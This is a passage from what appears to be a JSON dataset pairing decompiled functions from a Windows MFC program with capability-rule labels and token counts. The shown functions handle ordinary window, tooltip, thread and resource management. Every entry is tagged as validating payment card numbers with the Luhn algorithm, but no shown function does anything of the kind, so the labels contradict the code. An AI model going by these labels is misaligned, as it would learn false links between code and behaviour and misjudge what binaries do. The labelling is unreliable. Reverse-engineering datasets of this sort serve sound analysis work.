        "decompiled_code": "\nvoid fcn.14000c070(ulong hWnd, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t arg1;\n    int64_t iVar1;\n    int32_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    \n    for (arg1 = (*_sym.imp.USER32.dll_GetTopWindow)(); arg1 != 0; arg1 = (*_sym.imp.USER32.dll_GetWindow)(arg1)) {\n        if (in_stack_00000030 == 0) {\n            (*_sym.imp.USER32.dll_SendMessageA)();\n        }\n        else {\n            iVar1 = fcn.14000b3dc(arg1);\n            if (iVar1 != 0) {\n                fcn.14000bc5c(iVar1, *(iVar1 + 0x40), arg2, arg3);\n            }\n        }\n        if ((in_stack_00000028 != 0) && (iVar1 = (*_sym.imp.USER32.dll_GetTopWindow)(arg1),  iVar1 != 0)) {\n            fcn.14000c070(arg1, arg2, arg3, arg4);\n        }\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "14000d0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.14000d0d4(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uStack24;\n    ulong uStack16;\n    \n    uVar1 = fcn.140007b34(arg1);\n    if (((uVar1 >> 0x1e & 1) == 0) && (iVar3 = fcn.14000cd40(arg1),  iVar3 != 0)) {\n        if ((arg3 != 0) &&\n           ((iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(arg3 + 0x40)),  iVar2 != 0 &&\n            (iVar4 = fcn.14000cd40(arg3),  iVar3 == iVar4)))) {\n            return;\n        }\n        uStack24 = *(arg1 + 0x40);\n        if (arg3 == 0) {\n            uStack16 = 0;\n        }\n        else {\n            uStack16 = *(arg3 + 0x40);\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(*(iVar3 + 0x40), 0x36e, arg2, &uStack24);\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "14000d8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.14000d8c4(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    \n    iVar2 = (**(*arg1 + 0x250))();\n    if (iVar2 != 0) {\n        (**(*arg1 + 0x310))(arg1);\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(arg1[8]);\n    fcn.14000c070(arg1[8], 0x1f, 0, 0);\n    iVar3 = fcn.14000cd40(arg1);\n    if (iVar3 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(*(iVar3 + 0x40));\n    uVar5 = 1;\n    uVar4 = 1;\n    fcn.14000c070(*(iVar3 + 0x40), 0x1f, 0, 0);\n    iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x1f, 0, 0, uVar4, uVar5);\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "14000ff4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.14000ff4c(code **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    \n    *arg1 = vtable.CToolTipCtrl.0;\n    fcn.14000b6d8(arg1);\n    fcn.1400180f0(arg1 + 0x15);\n    uVar3 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x140053000)) && (arg1 != 0x1400530b0)) &&\n       ((arg1 != 0x140053160 && (arg1 != 0x140053210)))) {\n        fcn.14000b6d8(arg1);\n    }\n    piVar1 = arg1[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1, in_R8, in_R9, uVar3);\n    }\n    pcVar2 = arg1[0x14];\n    if ((pcVar2 != NULL) && (*(pcVar2 + 0x50) == arg1)) {\n        *(pcVar2 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 343
    },
    "14001082": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140010820(int64_t *arg1, uint *arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    ulong uStack24;\n    ulong uStack16;\n    \n    uVar1 = *(arg1 + 0xc);\n    uStack16 = *(arg1 + 0x14);\n    uStack24._0_4_ = uVar1;\n    uStack24 = uVar1;\n    if (uStack16 < uStack24) {\n        uStack24 = uVar1 & 0xffffffff00000000 | uStack16 & 0xffffffff;\n        uStack16 = uStack16 & 0xffffffff00000000 | uVar1 & 0xffffffff;\n    }\n    uVar2 = uStack24;\n    if (uStack16._4_4_ < uStack24._4_4_) {\n        uStack24 = uStack16 & 0xffffffff00000000 | uStack24 & 0xffffffff;\n        uStack16 = uVar2 & 0xffffffff00000000 | uStack16 & 0xffffffff;\n    }\n    iVar3 = 0;\n    if ((*(arg1 + 1) & 0x14) != 0) {\n        iVar3 = (**(*arg1 + 0x28))(uVar1, arg1, 0);\n        iVar3 = iVar3 + -1;\n    }\n    if ((*(arg1 + 1) & 3) != 0) {\n        iVar3 = iVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_InflateRect)(&uStack24, iVar3, iVar3);\n    *arg2 = uStack24;\n    arg2[1] = uStack24._4_4_;\n    arg2[2] = uStack16;\n    arg2[3] = uStack16._4_4_;\n    return;\n}\n",
        "token_count": 431
    },
    "1400111a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.1400111a0(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    \n    uVar1 = fcn.140010a4c(arg1, arg3);\n    if (uVar1 < 0) {\n        uVar2 = 0;\n    }\n    else {\n        *(arg1 + 0x28) = arg4;\n        uVar2 = fcn.140010e40(arg1, uVar1, arg2, arg3);\n    }\n    return uVar2;\n}\n",
        "token_count": 135
    },
    "1400111f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1400111fc(int64_t arg1, ulong arg2, uint64_t xRight, ulong arg4)\n\n{\n    uint64_t in_stack_ffffffffffffffe8;\n    \n    *(arg1 + 0x28) = arg4;\n    (*_sym.imp.USER32.dll_SetRect)\n              (arg1 + 0xc, xRight & 0xffffffff, xRight >> 0x20, xRight & 0xffffffff, \n               in_stack_ffffffffffffffe8 & 0xffffffff00000000 | xRight >> 0x20);\n    fcn.140010e40(arg1, 2, arg2, xRight);\n    return;\n}\n",
        "token_count": 148
    },
    "1400115b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.1400115b4(uint64_t arg1, uint64_t arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int64_t hModule;\n    int64_t iStackX32;\n    \n    arg1 = arg1 & 0xffffffff;\n    piVar5 = fcn.14000fd70();\n    if (piVar5 == NULL) {\n        fcn.140001010(0x80004005);\n        pcVar3 = swi(3);\n        uVar6 = (*pcVar3)();\n        return uVar6;\n    }\n    iVar7 = (**(*piVar5 + 0x18))(piVar5);\n    iStackX32 = iVar7 + 0x18;\n    hModule = fcn.14000fd5c(arg1);\n    iVar7 = iVar7 + 0x18;\n    if (hModule != 0) {\n        fcn.1400021c0(&iStackX32, hModule, arg1);\n        iVar7 = iStackX32;\n    }\n    if (arg3 == 0xffffffff) {\n        arg3._0_4_ = arg1;\n    }\n    uVar4 = fcn.14001155c(iVar7, arg2 & 0xffffffff, arg3);\n    LOCK();\n    piVar1 = iVar7 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iVar7 + -0x18) + 8))();\n    }\n    return uVar4;\n}\n",
        "token_count": 406
    },
    "1400123c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.1400123c8(code **arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    code **ppcVar4;\n    int64_t iVar5;\n    \n    fcn.140012c0c(arg1);\n    *arg1 = vtable.CWinApp.0;\n    if (arg2 == 0) {\n        arg1[0x14] = NULL;\n    }\n    else {\n        pcVar2 = fcn.14001ccc4(arg2);\n        arg1[0x14] = pcVar2;\n    }\n    iVar3 = fcn.140006c48();\n    if (iVar3 == 0) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        ppcVar4 = (*pcVar2)();\n        return ppcVar4;\n    }\n    iVar5 = fcn.140015718(iVar3 + 0xc0, 0x1400063b8);\n    if (iVar5 == 0) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        ppcVar4 = (*pcVar2)();\n        return ppcVar4;\n    }\n    if (iVar5 == 0) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        ppcVar4 = (*pcVar2)();\n        return ppcVar4;\n    }\n    *(iVar5 + 8) = arg1;\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)();\n    arg1[0xb] = pcVar2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *(arg1 + 0xc) = uVar1;\n    *(iVar3 + 8) = arg1;\n    arg1[0x11] = NULL;\n    arg1[0x1f] = NULL;\n    arg1[0x19] = NULL;\n    arg1[0x1a] = NULL;\n    arg1[0x15] = NULL;\n    arg1[0x18] = NULL;\n    arg1[0x22] = NULL;\n    arg1[0x16] = NULL;\n    *(arg1 + 0x122) = 0;\n    *(arg1 + 0x24) = 0;\n    arg1[0x12] = NULL;\n    arg1[0x23] = NULL;\n    *(arg1 + 0x20) = 0;\n    arg1[0x21] = NULL;\n    arg1[0x1c] = NULL;\n    arg1[0x1d] = NULL;\n    *(arg1 + 0x124) = 0;\n    arg1[0x26] = NULL;\n    *(arg1 + 0x17) = 0;\n    *(arg1 + 0x1b) = 0;\n    arg1[0x25] = 0x200;\n    return arg1;\n}\n",
        "token_count": 674
    },
    "14001285": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.14001285c(code **arg1)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = vtable.CWinThread.0;\n    if (arg1[0xb] != NULL) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    iVar1 = fcn.140006c98();\n    if (*(iVar1 + 8) == arg1) {\n        *(iVar1 + 8) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 145
    },
    "140012f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.140012f90(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    if (arg2 < 1) {\n        iVar5 = *(arg1 + 0x40);\n        if (((iVar5 != 0) && (*(iVar5 + 0x40) != 0)) && (iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(),  iVar2 != 0))\n        {\n            fcn.14000bc5c(iVar5, *(iVar5 + 0x40), 0x363, 1);\n            fcn.14000c070(*(iVar5 + 0x40), 0x363, 1, 0);\n        }\n        iVar3 = fcn.140006c48();\n        iVar3 = fcn.140015718(iVar3 + 0xc0, 0x1400063b8);\n        if (iVar3 == 0) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        for (iVar3 = *(iVar3 + 0x10); iVar3 != 0; iVar3 = *(iVar3 + 200)) {\n            if ((*(iVar3 + 0x40) != 0) && (iVar3 != iVar5)) {\n                if (*(iVar3 + 0x120) == 0) {\n                    fcn.140007c14(iVar3, 0);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x40));\n                if ((iVar2 != 0) || (-1 < *(iVar3 + 0x120))) {\n                    fcn.14000bc5c(iVar3, *(iVar3 + 0x40), 0x363, 1);\n                    fcn.14000c070(*(iVar3 + 0x40), 0x363, 1, 0);\n                }\n                if (0 < *(iVar3 + 0x120)) {\n                    fcn.140007c14(iVar3, *(iVar3 + 0x120));\n                }\n                *(iVar3 + 0x120) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        iVar5 = fcn.140006c48();\n        iVar5 = fcn.140015718(iVar5 + 0xc0, 0x1400063b8);\n        if (iVar5 == 0) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        if (*(iVar5 + 0x20) == 0) {\n            fcn.140016124();\n            fcn.1400163ec(1);\n        }\n    }\n    return arg2 < 1;\n}\n",
        "token_count": 672
    },
    "14001457": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.14001457c(ulong arg1, ulong hResData, ulong arg3, ulong arg4)\n\n{\n    ulong arg2;\n    \n    arg2 = (*_sym.imp.KERNEL32.dll_LockResource)(hResData);\n    fcn.140014518(arg1, arg2, arg3, 0);\n    return;\n}\n",
        "token_count": 77
    },
    "14001503": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.14001503c(int64_t *arg1, code *arg2)\n\n{\n    int64_t iVar1;\n    \n    if (*arg1 == 0) {\n        fcn.140016f8c(0x10);\n        if (*arg1 == 0) {\n            iVar1 = (*arg2)();\n            *arg1 = iVar1;\n        }\n        fcn.140017020(0x10);\n    }\n    return *arg1;\n}\n",
        "token_count": 105
    },
    "140015db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t * fcn.140015db8(int64_t *arg1, uint64_t arg2, int64_t *arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    \n    if (arg3 == NULL) {\n        fcn.140001010(0x80004005);\n        pcVar1 = swi(3);\n        piVar3 = (*pcVar1)();\n        return piVar3;\n    }\n    iVar4 = (**(*arg3 + 0x18))(arg3);\n    *arg1 = iVar4 + 0x18;\n    if (arg2 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        if ((arg2 & 0xffffffffffff0000) == 0) {\n            iVar4 = fcn.14000fd5c(arg2 & 0xffff);\n            if (iVar4 == 0) {\n                return arg1;\n            }\n            fcn.1400021c0(arg1, iVar4, arg2 & 0xffff);\n            return arg1;\n        }\n        uVar2 = fcn.14001bab0(arg2);\n    }\n    fcn.1400022f0(arg1, arg2, uVar2);\n    return arg1;\n}\n",
        "token_count": 294
    },
    "14001613": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.140016138(code **arg1, code *arg2, code *arg3, code *arg4)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    code *in_stack_00000028;\n    uint in_stack_00000030;\n    \n    *arg1 = vtable.CHandleMap.0;\n    fcn.140018d1c(arg1 + 1, *(arg2 + 8), 0x40);\n    fcn.140015ad8(arg1 + 6, 10);\n    fcn.140015ad8(arg1 + 0xd, 4);\n    if (arg3 == NULL) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        ppcVar2 = (*pcVar1)();\n        return ppcVar2;\n    }\n    if (arg4 == NULL) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        ppcVar2 = (*pcVar1)();\n        return ppcVar2;\n    }\n    fcn.140017df4(arg1 + 0xd, 7, 0);\n    arg1[0x14] = arg2;\n    arg1[4] = arg3;\n    arg1[5] = arg4;\n    arg1[0x15] = in_stack_00000028;\n    *(arg1 + 0x16) = in_stack_00000030;\n    return arg1;\n}\n",
        "token_count": 329
    },
    "1400163e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool fcn.1400163ec(ulong arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    ulong uVar5;\n    uint32_t uVar6;\n    \n    iVar1 = fcn.140006c98();\n    arg1_00 = 0;\n    if (*(iVar1 + 0x20) != 0) {\n        uVar6 = *(iVar1 + 0x20) - 1;\n        uVar4 = uVar6;\n        *(iVar1 + 0x20) = uVar6;\n        if (uVar6 == 0) {\n            if (arg1 != 0) {\n                if (arg1 != -1) {\n                    iVar2 = fcn.14001276c();\n                    if ((iVar2 != 0) && (*(iVar2 + 0x78) != NULL)) {\n                        uVar4 = 0;\n                        (**(iVar2 + 0x78))(0);\n                    }\n                }\n                fcn.1400162f4(*(iVar1 + 0x40), uVar4);\n                fcn.1400162f4(*(iVar1 + 0x38), uVar4);\n                fcn.1400162f4(*(iVar1 + 0x30), uVar4);\n                fcn.1400162f4(*(iVar1 + 0x28), uVar4);\n                fcn.1400162f4(*(iVar1 + 0x48), uVar4);\n            }\n            iVar2 = fcn.140006c48();\n            iVar2 = *(iVar2 + 8);\n            iVar3 = fcn.140015018(0x14004fe50);\n            if ((iVar3 != 0) && (iVar2 != 0)) {\n                if (*(iVar3 + 0x18) != 0) {\n                    uVar4 = fcn.14001cf84(*(iVar3 + 0x18));\n                    if (*(iVar2 + 0x128) <= uVar4) goto code_r0x00014001650b;\n                }\n                if (*(iVar2 + 0x128) != 0) {\n                    if (*(iVar3 + 0x18) != 0) {\n                        arg1_00 = fcn.14001cf84(*(iVar3 + 0x18));\n                        fcn.14001ba54(*(iVar3 + 0x18));\n                    }\n                    iVar2 = fcn.14001b99c(*(iVar2 + 0x128));\n                    *(iVar3 + 0x18) = iVar2;\n                    if ((iVar2 == 0) && (arg1_00 != 0)) {\n                        uVar5 = fcn.14001b99c(arg1_00);\n                        *(iVar3 + 0x18) = uVar5;\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00014001650b:\n    return *(iVar1 + 0x20) != 0;\n}\n",
        "token_count": 672
    },
    "1400167d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.1400167d8(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    ulong auStackX16 [3];\n    uchar auStack24 [16];\n    \n    auStackX16[0] = arg2;\n    (*_sym.imp.USER32.dll_ClientToScreen)(arg1, auStackX16);\n    uVar3 = 5;\n    do {\n        arg1 = (*_sym.imp.USER32.dll_GetWindow)(arg1, uVar3);\n        if (arg1 == 0) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(arg1);\n        if ((iVar1 != 0xffff) &&\n           (uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg1, 0xfffffff0),  (uVar2 >> 0x1c & 1) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(arg1, auStack24);\n            iVar1 = (*_sym.imp.USER32.dll_PtInRect)(auStack24, auStackX16[0]);\n            if (iVar1 != 0) {\n                return arg1;\n            }\n        }\n        uVar3 = 2;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "140017ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.140017ca8(code **arg1, ulong arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    code **ppcVar4;\n    int64_t iVar5;\n    uint64_t arg3_00;\n    \n    fcn.140005e88(arg1);\n    *arg1 = vtable.CArchiveException.0;\n    piVar3 = fcn.14000fd70();\n    arg3_00 = 0;\n    if (piVar3 == NULL) {\n        fcn.140001010(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar4 = (*pcVar1)();\n        return ppcVar4;\n    }\n    iVar5 = (**(*piVar3 + 0x18))(piVar3);\n    arg1[3] = iVar5 + 0x18;\n    *(arg1 + 2) = arg2;\n    if (arg3 != 0) {\n        uVar2 = fcn.14001bab0(arg3);\n        arg3_00 = uVar2;\n    }\n    fcn.1400022f0(arg1 + 3, arg3, arg3_00);\n    return arg1;\n}\n",
        "token_count": 287
    },
    "140017da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.140017da0(ulong arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    ulong uStackX24;\n    int64_t iStackX32;\n    \n    iStackX32 = fcn.140005870(0x20);\n    uStackX24 = 0;\n    if (iStackX32 != 0) {\n        uStackX24 = fcn.140017ca8(iStackX32, arg1, arg2);\n    }\n    fcn.14001bb88(&uStackX24, 0x14003acf0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 149
    },
    "140017fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.140017fe4(ulong noname_0, ulong noname_1, ulong *arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    uchar auStack24 [16];\n    \n    iVar1 = fcn.140017f58(noname_0, noname_1, auStack24, auStackX32);\n    if (iVar1 != 0) {\n        *arg3 = *(iVar1 + 0x18);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 124
    },
    "14001801": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.140018014(ulong arg1, ulong arg2, ulong *arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    uchar auStack24 [16];\n    \n    iVar1 = fcn.140017f58(arg1, arg2, auStack24, auStackX32);\n    if (iVar1 != 0) {\n        *arg3 = *(iVar1 + 0x10);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 115
    },
    "140018bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.140018bb4(ulong arg1, uint64_t arg2, ulong arg3, uint64_t arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t hModule;\n    int64_t iStack24;\n    ulong uStack16;\n    \n    uStack16 = 0xfffffffffffffffe;\n    piVar4 = fcn.14000fd70();\n    if (piVar4 != NULL) {\n        iVar5 = (**(*piVar4 + 0x18))(piVar4);\n        iStack24 = iVar5 + 0x18;\n        hModule = fcn.14000fd5c(arg2 & 0xffffffff);\n        iVar5 = iVar5 + 0x18;\n        if ((hModule == 0) ||\n           (iVar3 = fcn.1400021c0(&iStack24, hModule, arg2 & 0xffffffff),  iVar5 = iStack24,  iVar3 == 0)) {\n            LOCK();\n            piVar1 = iVar5 + -8;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar3 + -1 < 1) {\n                (**(**(iVar5 + -0x18) + 8))();\n            }\n        }\n        else {\n            fcn.1400189a8(arg1, iStack24, arg3, arg4 & 0xffffffff);\n            LOCK();\n            piVar1 = iVar5 + -8;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar3 + -1 < 1) {\n                (**(**(iVar5 + -0x18) + 8))();\n            }\n        }\n        return;\n    }\n    fcn.140001010(0x80004005);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 453
    },
    "140019a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.140019a0c(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    ulong uVar3;\n    ulong *puVar4;\n    uint64_t *puVar5;\n    ulong uStackX8;\n    int64_t aiStackX24 [2];\n    \n    if ((~*(arg1 + 0x20) & 1) == 0) {\n        uVar3 = 0;\n        if (*(arg1 + 0x58) == 0) {\n            uStackX8 = fcn.140005870(0x28);\n            if (uStackX8 != 0) {\n                uVar3 = fcn.14001a554(uStackX8);\n            }\n            *(arg1 + 0x58) = uVar3;\n            fcn.14001a574(uVar3, 1, *(arg1 + 0x68));\n            if (*(*(arg1 + 0x58) + 0x10) < 1) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            **(*(arg1 + 0x58) + 8) = 0;\n            *(arg1 + 0x50) = 1;\n            aiStackX24[0] = 0;\n            fcn.1400198f0(arg1, aiStackX24);\n            uStackX8 = uStackX8 & 0xffffffff00000000;\n            fcn.1400196a0(aiStackX24[0], 0, &uStackX8, 1);\n        }\n        if (arg2 != 0) {\n            fcn.140019450(arg1);\n            fcn.14001a718(*(arg1 + 0x58), *(arg1 + 0x50), arg2, 1);\n            aiStackX24[0] = 0;\n            fcn.14001598c(*(arg1 + 0x60), 1, aiStackX24);\n            if (aiStackX24[0] == 0) {\n                fcn.140005e30();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            uStackX8 = CONCAT44(uStackX8._4_4_, 2);\n            fcn.1400196a0(aiStackX24[0], *(arg1 + 0x50), &uStackX8, 1);\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n        }\n    }\n    else {\n        uVar3 = 0;\n        if (*(arg1 + 0x58) == 0) {\n            uStackX8 = fcn.140005870(0x38);\n            if (uStackX8 != 0) {\n                uVar3 = fcn.140015ad8(uStackX8, *(arg1 + 0x68));\n            }\n            *(arg1 + 0x58) = uVar3;\n            fcn.140017df4(uVar3, *(arg1 + 0x6c), 1);\n            puVar4 = fcn.140015b8c(*(arg1 + 0x58), 0);\n            *puVar4 = 0;\n            *(arg1 + 0x50) = 1;\n        }\n        if (arg2 != 0) {\n            fcn.140019450(arg1);\n            uVar1 = *(arg1 + 0x50);\n            puVar5 = fcn.140015b8c(*(arg1 + 0x58), arg2);\n            *puVar5 = uVar1;\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 866
    },
    "14000b23": {
        "rules": [
